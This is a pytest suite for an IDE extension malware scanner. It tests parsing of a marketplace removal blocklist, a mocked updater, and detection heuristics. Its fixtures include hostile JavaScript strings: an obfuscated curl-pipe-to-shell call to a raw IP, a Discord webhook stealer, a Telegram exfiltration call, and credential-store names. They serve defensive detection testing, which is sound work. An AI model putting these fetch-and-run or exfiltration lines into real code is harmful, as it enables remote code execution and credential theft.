"""IDE extension scanner + blocklist tests: parsing, updater (mocked), heuristics, benign popular extensions.
No real network access; works on Linux and Windows."""

import hashlib
import io
import json
import re
import urllib.error
from pathlib import Path
from types import SimpleNamespace

import pytest

from aegis.core.config import Config
from aegis.core.models import CheckStatus, Finding, Severity
from aegis.core.signatures import SignatureDB
from aegis.scanners import ide
from aegis.scanners.base import REGISTRY, ScanContext, load_all
from aegis.tools import ide_blocklist as bl

SAMPLE_MD = """# History of Extensions Removed from VS Marketplace

Some intro text with a | pipe in it.

| Extension Identifier | Removal Date | Type |
|---|---|---|
| AlfonsoGonzalez.VisualXML | 10/15/2026 | Malware |
| droidvisx.droidvisx | 10/15/2026 | Impersonation |
| famibee2.bluesnovel| 10/15/2026 | Impersonation |
| HazemBasha.azure-shell-theme | 10/14/2026 | Malware |
| nimblescape.comment-markdown-links| 10/13/2026 |  Untrustworthy |
| spammer.spammy | 1/2/2025 | Spam |
| someone.copycat | 1/2/2025 | Copyright violation |
| mixed.both | 3/3/2025 | Spam / Malware |
| mixed.both2 | 3/3/2025 | Impersonation, Malware |
|dup.thing | 1/1/2025 | Untrustworthy |
|DUP.thing | 6/1/2025 | Malware |
|dup.same | 1/1/2025 | Malware |
|dup.same | 6/1/2025 | Malware |
| lower.malware | 2/2/2025 | malware |
| pot.malicious | 2/2/2025 | Potentially malicious |
| typo.squat | 2/2/2025 | Typo-squatting |
| owner.removed | 2/2/2025 | Owner Request |
| bad date.row | notadate | Malware |
| 06a678fb-6fc1-623d-88d6-77ab9a4932cc.open-vs-embedded-browser | 3/21/2026 | Impersonation |
| not a valid id | 1/1/2025 | Malware |

Legend:
- Malware - Designed to infiltrate your system.
"""


# --------------------------------------------------------------------------- blocklist parsing
def test_parse_removed_packages_categories_and_cleanup():
    entries, rows = bl.parse_removed_packages(SAMPLE_MD)
    by = {e.ext_id: e for e in entries}
    assert by["alfonsogonzalez.visualxml"].category == "malware" and by["alfonsogonzalez.visualxml"].removed == "2026-10-15"
    assert by["droidvisx.droidvisx"].category == "impersonation" and by["famibee2.bluesnovel"].category == "impersonation"
    assert by["nimblescape.comment-markdown-links"].category == "untrustworthy"
    assert by["mixed.both"].category == "malware" and by["mixed.both2"].category == "malware"
    assert by["lower.malware"].category == "malware" and by["pot.malicious"].category == "malware"
    assert by["typo.squat"].category == "impersonation"
    assert "spammer.spammy" not in by and "someone.copycat" not in by and "owner.removed" not in by
    assert by["dup.thing"].category == "malware" and by["dup.thing"].removed == "2025-06-01"  # strongest category wins
    assert by["dup.same"].removed == "2025-06-01"  # latest date wins
    assert by["06a678fb-6fc1-623d-88d6-77ab9a4932cc.open-vs-embedded-browser"].category == "impersonation"
    assert "not a valid id" not in by and "extension identifier" not in by and "---" not in by
    assert rows == 18  # well-formed ids only: header, separator and malformed rows are not counted
    assert [e.ext_id for e in entries] == sorted(e.ext_id for e in entries)


def test_classify_type_vocabulary():
    assert bl.classify_type("Malware") == "malware" and bl.classify_type("Potentially malicious") == "malware"
    assert bl.classify_type("Spam / Malware") == "malware" and bl.classify_type("Impersonation, Malware") == "malware"
    assert bl.classify_type("Impersonation") == "impersonation" and bl.classify_type("Typo-squatting") == "impersonation"
    assert bl.classify_type("Untrustworthy") == "untrustworthy"
    for t in ("Spam", "Copyright violation", "Owner Request", "Publisher requested", "Deprecated", "Expired domain", "", "---"):
        assert bl.classify_type(t) is None


def test_render_and_parse_roundtrip_with_source_comments():
    entries, _ = bl.parse_removed_packages(SAMPLE_MD)
    text = bl.render_blocklist(entries, retrieved="2026-10-16")
    assert "https://github.com/microsoft/vsmarketplace/blob/main/RemovedPackages.md" in text
    assert "Retrieved 2026-10-16" in text and text.count("\n#") >= 5
    parsed = bl.parse_blocklist(text)
    assert len(parsed) == len(entries)
    assert parsed["alfonsogonzalez.visualxml"] == ("malware", "2026-10-15")
    # plain id-per-line files (older format) are still understood, comments ignored
    assert bl.parse_blocklist("# c\nFoo.Bar\n\nbad line here\n") == {"foo.bar": ("malware", "")}


def test_bundled_blocklist_is_a_verified_extract_of_the_microsoft_list():
    text = (bl.PACKAGE_DATA / bl.FILENAME).read_text(encoding="utf-8")
    head = "\n".join(text.splitlines()[:10])
    assert "microsoft/vsmarketplace" in head and "RemovedPackages.md" in head and "Retrieved 2026-" in head
    listed = bl.parse_blocklist(text)
    assert len(listed) > 1500
    cats = {c for c, _ in listed.values()}
    assert cats == {"malware", "impersonation", "untrustworthy"}
    assert sum(1 for c, _ in listed.values() if c == "malware") > 400
    for ext_id in ("ms-python.python", "esbenp.prettier-vscode", "ms-vscode.cpptools", "dbaeumer.vscode-eslint",
                   "github.copilot", "eamodio.gitlens", "ms-azuretools.vscode-docker"):
        assert ext_id not in listed
    # every entry well-formed
    for ext_id, (cat, date) in listed.items():
        assert re.fullmatch(r"[a-z0-9][a-z0-9_-]*\.[a-z0-9][a-z0-9._-]*", ext_id), ext_id
        assert date == "" or re.fullmatch(r"\d{4}-\d{2}-\d{2}", date)
    # a couple of Microsoft-listed malware ids from the 2025 rows of the table
    assert listed["ahban.shiba"][0] == "malware" and listed["ahban.cychelloworld"][0] == "malware"


def test_load_blocklist_merges_signatures_dir_copy(tmp_path):
    (tmp_path / bl.FILENAME).write_text("# extra\nnew.badext\tmalware\t2026-10-01\nahban.shiba\tuntrustworthy\t2025-03-13\n",
                                        encoding="utf-8")
    merged = bl.load_blocklist(tmp_path)
    assert merged["new.badext"] == ("malware", "2026-10-01")
    assert merged["ahban.shiba"][0] == "untrustworthy"  # the updated copy wins
    assert "ahban.cychelloworld" in merged  # bundled entries are kept
    assert len(bl.load_blocklist(tmp_path / "nonexistent")) > 1500


# --------------------------------------------------------------------------- updater (mocked)
class Resp(io.BytesIO):
    status = 200

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def big_markdown(malware=150, imp=400, untrust=100):
    rows = ["| Extension Identifier | Removal Date | Type |", "|---|---|---|"]
    rows += [f"| pub{i}.mal{i} | 1/{i % 28 + 1}/2026 | Malware |" for i in range(malware)]
    rows += [f"| pub{i}.imp{i} | 2/{i % 28 + 1}/2026 | Impersonation |" for i in range(imp)]
    rows += [f"| pub{i}.unt{i} | 3/{i % 28 + 1}/2026 | Untrustworthy |" for i in range(untrust)]
    rows += [f"| pub{i}.spam{i} | 4/{i % 28 + 1}/2026 | Spam |" for i in range(50)]
    return "# History of Extensions Removed from VS Marketplace\n\n" + "\n".join(rows) + "\n"


def route(monkeypatch, payload):
    seen = []

    def fake(req, timeout=None):
        seen.append(req.full_url)
        if isinstance(payload, Exception):
            raise payload
        return Resp(payload if isinstance(payload, bytes) else payload.encode())

    monkeypatch.setattr("urllib.request.urlopen", fake)
    return seen


def make_config(tmp_path):
    d = tmp_path / "sigs"
    d.mkdir()
    return SimpleNamespace(signatures_dir=d)


def test_update_ide_blocklist_downloads_validates_and_installs(tmp_path, monkeypatch):
    cfg = make_config(tmp_path)
    seen = route(monkeypatch, big_markdown())
    messages = []
    res = bl.update_ide_blocklist(cfg, progress=lambda name, msg: messages.append((name, msg)))
    assert seen == [bl.SOURCE_RAW]
    assert res["ok"] and res["count"] == 650 and res["malware"] == 150 and res["error"] == ""
    assert res["source"] == bl.SOURCE_PAGE and res["sha256"] == hashlib.sha256(big_markdown().encode()).hexdigest()
    target = cfg.signatures_dir / bl.FILENAME
    listed = bl.parse_blocklist(target.read_text(encoding="utf-8"))
    assert len(listed) == 650 and listed["pub3.mal3"][0] == "malware" and "pub1.spam1" not in listed
    assert [p.name for p in cfg.signatures_dir.iterdir()] == [bl.FILENAME]  # atomic write left no temp files
    assert messages and messages[0][0] == "ide_blocklist"
    assert bl.load_blocklist(cfg.signatures_dir)["pub3.mal3"][0] == "malware"


@pytest.mark.parametrize("payload,needle", [
    ("<html><body>Rate limit exceeded</body></html>", "table header"),
    (big_markdown(malware=5, imp=10, untrust=5), "looks invalid"),
    ("| Extension Identifier | Removal Date | Type |\n|---|---|---|\n" + "".join(f"| a{i}.b{i} | 1/1/2026 | Spam |\n" for i in range(600)),
     "looks invalid"),
])
def test_update_rejects_invalid_downloads_and_keeps_previous_copy(tmp_path, monkeypatch, payload, needle):
    cfg = make_config(tmp_path)
    target = cfg.signatures_dir / bl.FILENAME
    target.write_text("keep.me\tmalware\t2026-01-01\n", encoding="utf-8")
    route(monkeypatch, payload)
    res = bl.update_ide_blocklist(cfg)
    assert not res["ok"] and needle in res["error"]
    assert target.read_text(encoding="utf-8") == "keep.me\tmalware\t2026-01-01\n"
    assert [p.name for p in cfg.signatures_dir.iterdir()] == [bl.FILENAME]


def test_update_refuses_suspicious_shrinkage(tmp_path, monkeypatch):
    cfg = make_config(tmp_path)
    route(monkeypatch, big_markdown(malware=300, imp=900, untrust=300))
    assert bl.update_ide_blocklist(cfg)["ok"]
    before = (cfg.signatures_dir / bl.FILENAME).read_text(encoding="utf-8")
    route(monkeypatch, big_markdown(malware=150, imp=250, untrust=120))  # valid but less than half the size
    res = bl.update_ide_blocklist(cfg)
    assert not res["ok"] and "shrank" in res["error"]
    assert (cfg.signatures_dir / bl.FILENAME).read_text(encoding="utf-8") == before


@pytest.mark.parametrize("exc,needle", [
    (urllib.error.HTTPError(bl.SOURCE_RAW, 404, "nf", {}, None), "HTTP 404"),
    (urllib.error.HTTPError(bl.SOURCE_RAW, 429, "slow", {}, None), "HTTP 429"),
    (urllib.error.URLError("no route to host"), "no route"),
    (TimeoutError("timed out"), "timed out"),
])
def test_update_network_errors_never_raise(tmp_path, monkeypatch, exc, needle):
    cfg = make_config(tmp_path)
    route(monkeypatch, exc)
    res = bl.update_ide_blocklist(cfg)
    assert res["ok"] is False and needle in res["error"] and res["count"] == 0
    assert list(cfg.signatures_dir.iterdir()) == []


def test_update_with_progress_callback_variants(tmp_path, monkeypatch):
    route(monkeypatch, big_markdown())
    singles = []
    assert bl.update_ide_blocklist(make_config(tmp_path), progress=singles.append)["ok"]  # one-argument callback
    assert any("updated" in m for m in singles)


def test_update_rejects_oversized_download(tmp_path, monkeypatch):
    monkeypatch.setattr(bl, "MAX_BYTES", 1000)
    route(monkeypatch, big_markdown())
    res = bl.update_ide_blocklist(make_config(tmp_path))
    assert not res["ok"] and "size limit" in res["error"]


# --------------------------------------------------------------------------- scanner helpers
def make_ctx(tmp_path, ext_dirs=None, **options):
    cfg = Config.load()
    cfg.use_windows_defender_engine = False
    opts = dict(options)
    if ext_dirs is not None:
        opts["ide_extension_dirs"] = [str(p) for p in ext_dirs]
    return ScanContext(config=cfg, signatures=SignatureDB(cfg), paths=[], options=opts)


MINIFIED_BENIGN = ("var e=require('child_process'),t=require('vscode');function r(){return e.execSync('git rev-parse HEAD')}"
                   "exports.activate=function(n){t.commands.registerCommand('x.y',r)};" * 300)
OBFUSCATED_EVIL = ("var " + ",".join(f"_0x{i:04x}=[{i}]" for i in range(80)) + ";const cp=require('child_process');"
                   "cp.exec('curl http://203.0.113.50:8080/p|sh');")
DISCORD_STEALER = ("var " + ",".join(f"_0x{i:04x}=[{i}]" for i in range(50)) + ";"
                   "fetch('https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz0123456789ABCD',{method:'POST'});")


def add_ext(ext_dir, publisher, name, version="1.0.0", code="exports.activate=function(){};", activation=None,
            gallery=True, source=None, registry=None, main="./extension.js", contributes=None, extra=None):
    folder = ext_dir / f"{publisher}.{name}-{version}"
    folder.mkdir(parents=True, exist_ok=True)
    manifest = {"name": name, "publisher": publisher, "version": version, "displayName": name.title(), "main": main,
                "engines": {"vscode": "^1.80.0"}, "contributes": contributes or {"commands": [{"command": "x.y", "title": "X"}]}}
    if activation is not None:
        manifest["activationEvents"] = activation
    manifest.update(extra or {})
    (folder / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
    if main and not main.startswith(".."):
        target = folder / main
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(code, encoding="utf-8")
    meta = ({"source": "gallery", "id": "11111111-2222-3333-4444-555555555555", "publisherId": "99999999-aaaa-bbbb-cccc-dddddddddddd",
             "publisherDisplayName": publisher, "installedTimestamp": 1_760_000_000_000, "targetPlatform": "undefined"}
            if gallery else {"source": source or "vsix", "installedTimestamp": 1_760_000_000_000})
    entry = {"identifier": {"id": f"{publisher}.{name}"}, "version": version,
             "location": {"$mid": 1, "path": "/x/" + folder.name, "scheme": "file"}, "relativeLocation": folder.name, "metadata": meta}
    if gallery:
        entry["identifier"]["uuid"] = "11111111-2222-3333-4444-555555555555"
    registry = registry if registry is not None else ext_dir / "extensions.json"
    try:
        current = json.loads(registry.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        current = []
    current.append(entry)
    registry.write_text(json.dumps(current), encoding="utf-8")
    return folder


@pytest.fixture
def ext_dir(tmp_path):
    d = tmp_path / "home" / ".vscode" / "extensions"
    d.mkdir(parents=True)
    return d


def scan(tmp_path, ext_dir):
    ctx = make_ctx(tmp_path, [ext_dir])
    out = list(ide.IdeExtensionScanner().run(ctx))
    return [i for i in out if isinstance(i, Finding)], [i for i in out if not isinstance(i, Finding)], ctx


# --------------------------------------------------------------------------- scanner behaviour
def test_scanner_registered_in_load_all_and_full_profile():
    from aegis.core.engine import PROFILES

    load_all()
    assert "ide" in REGISTRY and "ide" in PROFILES["full"]
    inst = REGISTRY["ide"]()
    assert inst.name == "ide" and inst.supported()


def test_blocklisted_malware_extension_is_critical_with_safe_remediation(tmp_path, ext_dir):
    folder = add_ext(ext_dir, "ahban", "shiba", "0.0.1", code="x")
    findings, checks, ctx = scan(tmp_path, ext_dir)
    assert len(findings) == 1
    f = findings[0]
    assert f.rule_id == "AEG-IDE-BLOCKLIST" and f.severity == Severity.CRITICAL and f.category == "malware"
    assert "ahban.shiba" in f.title and f.location == str(folder)
    assert f.evidence["extension"] == "ahban.shiba" and f.evidence["blocklist_category"] == "malware"
    assert f.evidence["removed"] == "2025-03-13" and "RemovedPackages.md" in f.evidence["source"]
    assert f.remediation.action == "remove_path" and f.remediation.params["path"] == str(folder)
    assert Path(f.remediation.params["path"]).parent == ext_dir  # only ever a folder inside the extensions dir
    assert "T1195.002" in f.mitre and "T1176.002" in f.mitre and "rotate" in f.recommendation
    assert checks[0].check_id == "AEG-IDE-EXTENSIONS" and checks[0].status == CheckStatus.FAIL
    assert ctx.stats["ide_extensions"] == 1


def test_blocklist_matching_is_case_insensitive_and_version_agnostic(tmp_path, ext_dir):
    add_ext(ext_dir, "AlfonsoGonzalez", "VisualXML", "9.9.9", code="x")
    findings, _, _ = scan(tmp_path, ext_dir)
    assert [f.rule_id for f in findings] == ["AEG-IDE-BLOCKLIST"] and findings[0].severity == Severity.CRITICAL


@pytest.mark.parametrize("pub,name,sev,cat", [
    ("droidvisx", "droidvisx", Severity.HIGH, "impersonation"),
    ("nimblescape", "comment-markdown-links", Severity.MEDIUM, "untrustworthy"),
])
def test_other_blocklist_categories_map_to_severity(tmp_path, ext_dir, pub, name, sev, cat):
    add_ext(ext_dir, pub, name, code="x")
    f = scan(tmp_path, ext_dir)[0][0]
    assert f.severity == sev and f.evidence["blocklist_category"] == cat and f.remediation.action == "remove_path"


def test_benign_popular_extensions_are_not_flagged_even_with_minified_process_spawning_code(tmp_path, ext_dir):
    add_ext(ext_dir, "ms-python", "python", "2026.1.0", code=MINIFIED_BENIGN, activation=["*"])
    add_ext(ext_dir, "esbenp", "prettier-vscode", "11.0.0", code=MINIFIED_BENIGN, activation=["*"])
    add_ext(ext_dir, "ms-vscode", "cpptools", "1.20.0", code=OBFUSCATED_EVIL, activation=["*"])  # trusted publisher: never inspected
    add_ext(ext_dir, "someauthor", "nice-theme", "2.0.0", code=MINIFIED_BENIGN, activation=["onStartupFinished"])
    add_ext(ext_dir, "otherauthor", "always-on", "1.0.0", code=MINIFIED_BENIGN, activation=["*"])  # minified + child_process only
    findings, checks, _ = scan(tmp_path, ext_dir)
    assert findings == []
    assert checks[0].status == CheckStatus.PASS and "5 extension(s)" in checks[0].detail


def test_trusted_publisher_status_requires_marketplace_metadata(tmp_path, ext_dir):
    # same publisher id but sideloaded as a VSIX: the publisher string proves nothing, code heuristics apply
    add_ext(ext_dir, "ms-python", "python", "2026.1.0", code=OBFUSCATED_EVIL, activation=["*"], gallery=False)
    findings, _, _ = scan(tmp_path, ext_dir)
    assert [f.rule_id for f in findings] == ["AEG-IDE-SIDELOAD-RISKY"]


def test_always_active_extension_with_obfuscated_process_and_raw_ip_code_is_medium(tmp_path, ext_dir):
    add_ext(ext_dir, "randomdev", "super-helper", "1.2.3", code=OBFUSCATED_EVIL, activation=["*"])
    f = scan(tmp_path, ext_dir)[0][0]
    assert f.rule_id == "AEG-IDE-SUSPICIOUS-CODE" and f.severity == Severity.MEDIUM and f.category == "suspicious"
    assert f.evidence["activation_events"] == ["*"] and f.evidence["marketplace_install"] is True
    assert "203.0.113.50" in f.evidence["raw_ips"]
    assert any("obfuscator-style" in s for s in f.evidence["signals"]) and any("child_process" in s for s in f.evidence["signals"])
    assert f.remediation.action == "remove_path" and "T1176.002" in f.mitre


def test_same_code_without_star_activation_is_not_flagged_for_marketplace_installs(tmp_path, ext_dir):
    add_ext(ext_dir, "randomdev", "super-helper", "1.2.3", code=OBFUSCATED_EVIL, activation=["onCommand:x.y"])
    add_ext(ext_dir, "randomdev", "implicit-activation", "1.0.0", code=OBFUSCATED_EVIL)  # no activationEvents at all
    assert scan(tmp_path, ext_dir)[0] == []


def test_sideloaded_vsix_with_discord_webhook_and_obfuscation(tmp_path, ext_dir):
    add_ext(ext_dir, "unknown", "dark-theme-pro", "0.1.0", code=DISCORD_STEALER, gallery=False, activation=["onCommand:x"])
    f = scan(tmp_path, ext_dir)[0][0]
    assert f.rule_id == "AEG-IDE-SIDELOAD-RISKY" and f.severity == Severity.MEDIUM and f.evidence["marketplace_install"] is False
    assert f.evidence["webhooks"] and any("webhook" in s for s in f.evidence["signals"])


def test_sideloaded_vsix_with_clean_or_merely_minified_code_is_not_flagged(tmp_path, ext_dir):
    add_ext(ext_dir, "me", "my-own-ext", "0.0.1", code="exports.activate=function(){console.log('hi')};", gallery=False)
    add_ext(ext_dir, "me", "minified-ext", "0.0.1", code=MINIFIED_BENIGN, gallery=False)  # child_process alone is normal
    add_ext(ext_dir, "me", "local-server-ext", "0.0.1", gallery=False,
            code="fetch('http://127.0.0.1:8080/x');fetch('http://192.168.1.10/y');fetch('http://10.0.0.5/z');require('child_process');" * 5)
    assert scan(tmp_path, ext_dir)[0] == []


def test_webhook_plus_child_process_is_enough_without_obfuscation(tmp_path, ext_dir):
    code = ("require('child_process').exec('whoami');fetch('https://api.telegram.org/bot123456789:"
            "AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw_abcdefgh/sendMessage');")
    add_ext(ext_dir, "x", "telegram-bot-ext", "1.0.0", code=code, gallery=False)
    f = scan(tmp_path, ext_dir)[0][0]
    assert f.rule_id == "AEG-IDE-SIDELOAD-RISKY"


def test_user_configured_webhook_url_without_a_token_is_not_a_signal(tmp_path, ext_dir):
    add_ext(ext_dir, "x", "notifier", "1.0.0", gallery=False,
            code="const url = config.get('webhook'); // e.g. https://discord.com/api/webhooks/<id>/<token>\nrequire('child_process');")
    assert scan(tmp_path, ext_dir)[0] == []


def test_obsolete_and_non_extension_folders_are_ignored(tmp_path, ext_dir):
    folder = add_ext(ext_dir, "ahban", "shiba", "0.0.1", code="x")
    (ext_dir / ".obsolete").write_text(json.dumps({folder.name: True}), encoding="utf-8")
    (ext_dir / "random-folder").mkdir()  # no package.json
    (ext_dir / ".hidden").mkdir()
    findings, checks, _ = scan(tmp_path, ext_dir)
    assert findings == [] and checks[0].status == CheckStatus.PASS and "0 extension(s)" in checks[0].detail


def test_extensions_without_registry_file_use_package_json(tmp_path, ext_dir):
    folder = ext_dir / "ahban.shiba-0.0.1"
    folder.mkdir()
    (folder / "package.json").write_text(json.dumps({"name": "shiba", "publisher": "ahban", "version": "0.0.1"}), encoding="utf-8")
    findings, _, _ = scan(tmp_path, ext_dir)
    assert len(findings) == 1 and findings[0].evidence["marketplace_install"] is False


def test_main_path_traversal_and_missing_entry_are_harmless(tmp_path, ext_dir):
    secret = tmp_path / "outside.js"
    secret.write_text(OBFUSCATED_EVIL, encoding="utf-8")
    add_ext(ext_dir, "randomdev", "escape", "1.0.0", code="x", activation=["*"], main="../../../outside.js")
    add_ext(ext_dir, "randomdev", "nomain", "1.0.0", code="x", activation=["*"], main="./does-not-exist.js")
    add_ext(ext_dir, "randomdev", "nofile", "1.0.0", code="x", activation=["*"], main="")
    assert scan(tmp_path, ext_dir)[0] == []


def test_entry_point_without_js_suffix_is_resolved(tmp_path, ext_dir):
    folder = add_ext(ext_dir, "randomdev", "noext", "1.0.0", code="x", activation=["*"], main="./out/extension")
    (folder / "out" / "extension").unlink()  # VS Code resolves "./out/extension" to extension.js
    (folder / "out" / "extension.js").write_text(OBFUSCATED_EVIL, encoding="utf-8")
    assert [f.rule_id for f in scan(tmp_path, ext_dir)[0]] == ["AEG-IDE-SUSPICIOUS-CODE"]


def test_malformed_manifests_do_not_break_the_scan(tmp_path, ext_dir):
    bad = ext_dir / "bad.ext-1.0.0"
    bad.mkdir()
    (bad / "package.json").write_text("{not json", encoding="utf-8")
    weird = ext_dir / "weird.ext-1.0.0"
    weird.mkdir()
    (weird / "package.json").write_text(json.dumps({"name": 5, "publisher": None, "activationEvents": "oops", "contributes": []}),
                                        encoding="utf-8")
    (ext_dir / "extensions.json").write_text("[1, 2, {\"identifier\": 3}, null]", encoding="utf-8")
    findings, checks, _ = scan(tmp_path, ext_dir)
    assert findings == [] and checks[0].status == CheckStatus.PASS


def test_no_ide_folders_gives_skip_and_never_raises(tmp_path):
    ctx = make_ctx(tmp_path, [tmp_path / "nothing-here"])
    out = list(ide.IdeExtensionScanner().run(ctx))
    assert [o.status for o in out] == [CheckStatus.SKIP]


def test_extension_dirs_discovery_for_each_ide(tmp_path):
    home = tmp_path / "home"
    for rel in (".vscode/extensions", ".vscode-insiders/extensions", ".cursor/extensions", ".windsurf/extensions",
                ".vscode-oss/extensions", ".vscode-server/extensions"):
        (home / rel).mkdir(parents=True)
    found = ide.extension_dirs(home=home)
    assert {n for n, _ in found} == {"VS Code", "VS Code Insiders", "Cursor", "Windsurf", "VSCodium", "VS Code Server"}
    assert ide.extension_dirs(home=tmp_path / "empty") == []


def test_default_discovery_uses_user_home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    (home / ".cursor" / "extensions").mkdir(parents=True)
    monkeypatch.setattr(ide, "user_home", lambda: home)
    monkeypatch.delenv("VSCODE_EXTENSIONS", raising=False)
    add_ext(home / ".cursor" / "extensions", "ahban", "shiba", "0.0.1", code="x")
    ctx = make_ctx(tmp_path)  # no ide_extension_dirs option: real discovery path
    out = list(ide.IdeExtensionScanner().run(ctx))
    findings = [o for o in out if isinstance(o, Finding)]
    assert len(findings) == 1 and findings[0].evidence["ide"] == "Cursor"


def test_findings_serialise_and_use_valid_mitre_ids(tmp_path, ext_dir):
    add_ext(ext_dir, "ahban", "shiba", "0.0.1", code="x")
    add_ext(ext_dir, "randomdev", "super-helper", "1.2.3", code=OBFUSCATED_EVIL, activation=["*"])
    add_ext(ext_dir, "unknown", "dark", "0.1.0", code=DISCORD_STEALER, gallery=False)
    findings, checks, _ = scan(tmp_path, ext_dir)
    assert len(findings) == 3
    retired = {"T1562", "T1562.001", "T1070.001", "T1574.002", "T1656"}
    for f in findings:
        json.dumps(f.to_dict())
        assert f.rule_id.startswith("AEG-IDE-") and f.mitre and not (set(f.mitre) & retired)
        assert all(re.fullmatch(r"T\d{4}(\.\d{3})?", m) for m in f.mitre)
    assert len({f.fingerprint for f in findings}) == 3
    json.dumps(checks[0].to_dict())


def test_code_analysis_unit_signals():
    assert not ide.analyze_code(b"function a(){return 1}").risky
    sig = ide.analyze_code(OBFUSCATED_EVIL.encode())
    assert sig.obfuscated and sig.child_process and sig.raw_ips == ["203.0.113.50"] and sig.risky
    assert not ide.analyze_code(b"fetch('http://127.0.0.1:1/');fetch('http://172.20.1.1/');fetch('http://169.254.169.254/')").raw_ips
    assert ide.analyze_code(b"var a=1; eval(atob('ZXZpbCgp'))").obfuscated
    # webpack bundles of ordinary libraries contain thousands of hex escapes / fromCharCode calls: not obfuscation
    lib = ide.analyze_code(b"\\x41" * 5000 + b"String.fromCharCode(1);" * 200 + b"require('child_process');eval('1')")
    assert not lib.obfuscated and not lib.risky
    packed = ide.analyze_code(b"eval(function(p,a,c,k,e,d){while(c--)if(k[c])p=p.replace(1,k[c]);return p}('0 1',2,2,'a|b'.split('|'),0,{}))")
    assert packed.obfuscated and packed.eval_use and packed.risky  # a packed script evaluates its payload
    names_only = ide.analyze_code(("var " + ",".join(f"_0x{i:04x}=1" for i in range(40)) + ";").encode())
    assert names_only.obfuscated and not names_only.risky  # obfuscation alone is not enough
    assert ide.analyze_code(b"[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]").obfuscated
    cred = ide.analyze_code(b"require('child_process');fetch('http://198.51.100.7/x');'Login Data';'Local State'")
    assert cred.risky and len(cred.cred_tokens) == 2


def test_blocklist_still_applies_when_the_code_analysis_budget_is_exhausted(tmp_path, ext_dir):
    add_ext(ext_dir, "ahban", "shiba", "0.0.1", code="x")
    add_ext(ext_dir, "randomdev", "super-helper", "1.2.3", code=OBFUSCATED_EVIL, activation=["*"])
    ctx = make_ctx(tmp_path, [ext_dir], ide_max_seconds=-1)  # budget already spent
    findings = [i for i in ide.IdeExtensionScanner().run(ctx) if isinstance(i, Finding)]
    assert [f.rule_id for f in findings] == ["AEG-IDE-BLOCKLIST"]  # cheap lookup kept, code heuristics skipped


def test_hostile_manifest_does_not_stop_the_scan(tmp_path, ext_dir):
    bad = ext_dir / "deep.ext-1.0.0"
    bad.mkdir()
    (bad / "package.json").write_text("[" * 200000 + "]" * 200000, encoding="utf-8")
    add_ext(ext_dir, "ahban", "shiba", "0.0.1", code="x")
    findings, _, _ = scan(tmp_path, ext_dir)
    assert [f.rule_id for f in findings] == ["AEG-IDE-BLOCKLIST"]
